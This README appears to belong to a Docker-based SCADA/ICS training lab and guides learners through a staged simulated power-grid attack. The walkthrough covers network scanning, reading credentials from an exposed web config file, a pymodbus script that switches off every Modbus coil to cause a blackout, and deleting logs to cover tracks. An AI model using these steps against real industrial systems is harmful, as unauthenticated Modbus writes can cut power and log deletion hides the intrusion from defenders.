# Docker-Based SCADA/ICS Cybersecurity Lab

This lab simulates a realistic power grid (SCADA/ICS) environment, designed as a guided attack simulation. You will experience a complete attacker journey, from initial reconnaissance to impacting critical infrastructure.

## 1. Prerequisites
- Docker Desktop or Docker Engine + Docker Compose
- Python 3.11+ (for local testing, though most runs inside Docker)
- 4GB RAM minimum

## 2. Lab Overview
The lab simulates a simplified version of a power grid attack. It uses **Modbus TCP** as the communication protocol between the HMI and the SCADA server.

**Network Layout:**
`[IT Workstation] <-> [IT Net] <-> [DMZ Webserver] <-> [DMZ Net] <-> [SCADA Server] <-> [OT Net] <-> [HMI Client]`

| Container | Role | Network |
|-----------|------|---------|
| `it-workstation` | Initial access point for attacker | `it-net` |
| `dmz-webserver` | Vulnerable Flask portal | `it-net`, `dmz-net` |
| `scada-server` | Modbus TCP server managing power zones | `dmz-net`, `ot-net` |
| `hmi-client` | Operator dashboard (Curses CLI) | `ot-net` |
| `logger` | Centralized log management | All |

## 3. Setup Instructions
```bash
# Step 1: Navigate to the lab directory
cd /home/neovanta/Projects/ICS-Lab-Simulation

# Step 2: Build and start the containers
docker compose up --build -d

# Step 3: Verify everything is running
docker ps
```

## 4. Launching the HMI Dashboard
The HMI dashboard represents what the real operator sees.
```bash
docker exec -it hmi-client python3 hmi_dashboard.py
```
*Controls: Use `0-3` keys to toggle zones. Press `q` to quit.*

## 5. Attack Walkthrough

### Stage 1: Reconnaissance
**Goal:** Discover services in the network.
```bash
docker exec -it it-workstation nmap -sn 10.0.0.0/8
docker exec -it it-workstation curl http://dmz-webserver:5000/
```

### Stage 2: Initial Access
**Goal:** Find credentials in the vulnerable web portal.
```bash
docker exec -it it-workstation curl http://dmz-webserver:5000/static/config.json
```
*Observation: You found the `operator` credentials!*

### Stage 3: Persistence / Malware
**Goal:** Pivot into the workstation as the operator.
```bash
# In a real scenario, you'd use the credentials. Here, we'll "be" the operator.
docker exec -it --user operator it-workstation bash
cat /home/operator/notes.txt
```

### Stage 4: Lateral Movement
**Goal:** Use found information to reach the OT network.
The notes mention the `engineer` password: `super_grid_eng_99`.

### Stage 5: Impact
**Goal:** Interact with the SCADA server using Modbus to cause a blackout.
```bash
# Run a custom script inside it-workstation (as engineer) to toggle coils
docker exec -it it-workstation python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('scada-server', port=502)
client.connect()
for i in range(4):
    client.write_coil(i, False, device_id=1)
client.close()
"
```
*Observation: Watch the HMI dashboard turn all zones RED (OFFLINE).*

### Stage 6: Covering Tracks
**Goal:** Clear your traces in the logger.
```bash
docker exec -it logger rm /var/log/scada_lab.log
```

## 6. Resetting the Lab
```bash
docker compose down
docker compose up --build -d
```

## 7. Troubleshooting
- **HMI Error:** If the HMI can't connect, wait 5 seconds for the SCADA server to initialize.
- **Permission Denied:** Ensure you are running commands with appropriate permissions or as the correct user inside the container.

## 8. Learning Objectives
- [ ] Understand network segmentation (IT vs DMZ vs OT).
- [ ] Identify common vulnerabilities in ICS-linked web portals.
- [ ] Learn basic Modbus TCP communication.
- [ ] Experience the impact of digital attacks on physical infrastructure.
